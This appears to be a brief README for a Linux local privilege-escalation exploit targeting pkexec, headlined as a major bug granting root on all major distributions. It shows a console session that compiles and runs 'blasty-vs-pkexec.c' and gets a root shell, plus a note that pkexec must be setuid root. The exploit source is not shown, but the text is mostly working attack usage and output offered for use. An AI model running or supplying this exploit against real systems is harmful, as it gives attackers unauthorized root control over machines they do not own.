## 🐧MAJOR BUG GRANTS ROOT FOR ALL MAJOR LINUX DISTRIBUTIONS

```console
user@linux:~$ gcc -o blasty blasty-vs-pkexec.c
user@linux:~$ ./blasty
[~] compile helper..
[~] maybe get shell now?
# whoami
root

```
exploitation when debugging:
```debug
pkexec must be setuid root
```
